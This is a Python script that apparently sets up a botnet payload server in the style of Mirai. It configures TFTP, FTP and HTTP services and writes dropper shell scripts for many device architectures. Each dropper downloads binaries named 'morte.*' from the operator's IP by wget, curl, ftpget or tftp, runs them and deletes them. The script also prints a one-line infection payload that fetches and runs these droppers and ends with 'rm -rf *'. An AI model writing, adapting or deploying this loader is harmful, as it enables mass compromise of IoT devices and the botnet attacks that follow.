import subprocess
import urllib.request

def run(cmd):
    subprocess.call(cmd, shell=True)

def setup_services(ip):
    print("Setting up HTTP, TFTP and FTP for your payload")
    print(" ")

    tftp_config = """service tftp
{
    socket_type             = dgram
    protocol                = udp
    wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
"""
    with open("/etc/xinetd.d/tftp", "w") as f:
        f.write(tftp_config)
    run("service xinetd start &> /dev/null")

    ftp_config = f"""listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address={ip}
listen_port=21
"""
    with open("/etc/vsftpd.conf", "w") as f:
        f.write(ftp_config)
    run("service vsftpd restart &> /dev/null")
    run("service xinetd restart &> /dev/null")

def create_sh_files(ip, bin_prefix, bin_directory, archs):
    print("Creating .sh Bins")
    print(" ")

    with open("/var/lib/tftpboot/1.sh", "w") as f:
        f.write("#!/bin/bash\n")
        f.write("ulimit -n 1024\n")
        f.write("cp /bin/busybox /tmp/\n")

    with open("/var/lib/tftpboot/3.sh", "w") as f:
        f.write("#!/bin/bash\n")
        f.write("ulimit -n 1024\n")
        f.write("cp /bin/busybox /tmp/\n")

    with open("/var/www/html/1.sh", "w") as f:
        f.write("#!/bin/bash\n")
        f.write("ulimit -n 1024\n")
        f.write("cp /bin/busybox /tmp/\n")

    with open("/var/ftp/2.sh", "w") as f:
        f.write("#!/bin/bash\n")
        f.write("ulimit -n 1024\n")
        f.write("cp /bin/busybox /tmp/\n")

    for arch in archs:
        with open("/var/www/html/1.sh", "a") as f:
            f.write(f"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; "
                    f"wget http://{ip}/{bin_directory}/{bin_prefix}{arch}; "
                    f"curl -O http://{ip}/{bin_directory}/{bin_prefix}{arch}; "
                    f"chmod +x *; ./{bin_prefix}{arch} {bin_prefix}{arch}; "
                    f"rm -rf {bin_prefix}{arch}\n")

        with open("/var/ftp/2.sh", "a") as f:
            f.write(f"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; "
                    f"ftpget -v -u anonymous -p anonymous -P 21 {ip} {bin_prefix}{arch} {bin_prefix}{arch}; "
                    f"chmod +x *; ./{bin_prefix}{arch} {bin_prefix}{arch}; "
                    f"rm -rf {bin_prefix}{arch}\n")

        with open("/var/lib/tftpboot/1.sh", "a") as f:
            f.write(f"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; "
                    f"tftp {ip} -c get {bin_prefix}{arch}; "
                    f"chmod +x *; ./{bin_prefix}{arch} {bin_prefix}{arch}; "
                    f"rm -rf {bin_prefix}{arch}\n")

        with open("/var/lib/tftpboot/3.sh", "a") as f:
            f.write(f"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; "
                    f"tftp -r {bin_prefix}{arch} -g {ip}; "
                    f"chmod +x *; ./{bin_prefix}{arch} {bin_prefix}{arch}; "
                    f"rm -rf {bin_prefix}{arch}\n")

def generate_payload(ip):
    payload = (f"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; "
               f"wget http://{ip}/1.sh; "
               f"curl -O http://{ip}/1.sh; "
               f"chmod 777 1.sh; "
               f"sh 1.sh; "
               f"tftp {ip} -c get 1.sh; "
               f"chmod 777 1.sh; "
               f"sh 1.sh; "
               f"tftp -r 3.sh -g {ip}; "
               f"chmod 777 3.sh; "
               f"sh 3.sh; "
               f"ftpget -v -u anonymous -p anonymous -P 21 {ip} 2.sh 2.sh; "
               f"sh 2.sh; "
               f"rm -rf 1.sh 1.sh 3.sh 2.sh; "
               f"rm -rf *")
    print(f"\x1b[39m\033[38;5;125mPayload: {payload}\x1b[0m")
    print("")
    with open("payload.txt", "w") as f:
        f.write(payload)

ip = urllib.request.urlopen('http://api.ipify.org').read().decode('utf-8')
bin_prefix = "morte."
bin_directory = "00101010101001"
archs = ["x86", "mips", "arc", "i468", "i686", "x86_64", "mpsl", "arm", "arm5", "arm6", "arm7", "ppc", "spc", "m68k", "sh4"]

setup_services(ip)
create_sh_files(ip, bin_prefix, bin_directory, archs)
run("service xinetd restart &> /dev/null")
run("service apache2 restart &> /dev/null")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')
generate_payload(ip)